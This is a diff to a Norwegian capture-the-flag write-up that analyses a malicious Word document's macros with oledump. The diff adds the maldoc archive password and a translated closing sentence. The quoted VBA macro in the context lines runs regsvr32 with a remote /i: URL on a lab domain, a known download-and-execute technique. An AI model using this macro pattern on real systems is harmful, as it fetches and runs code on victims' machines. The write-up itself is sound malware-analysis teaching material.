@@ -90,6 +90,9 @@ https://påskenøtter.helsectf.no/challenges#Registrert%20bibliotek
 Bruker oledump for å identifisere makroer. 
 
 Se [Challenge09](/challenge09) for output.
+Passordet for maldoc i /artefacts-folderen er "healhty_nuts".
+
+
 
 ```
 python3 oledump.py Overdue_Ticket_4825.doc 
@@ -122,4 +125,4 @@ Private Sub LetsGo()
     out = shell.Run("regsvr32 /u /n /s /i:http://this.url.looks.a.bit.phishy.lab/EGG{00099e44e9b6e8d4337cc29ccf436410}/ scrobj.dll", 0, False)
 End Sub
 ```
-and our egg is `EGG{00099e44e9b6e8d4337cc29ccf436410}`.
+og dermed blir påskeegget: `EGG{00099e44e9b6e8d4337cc29ccf436410}`.
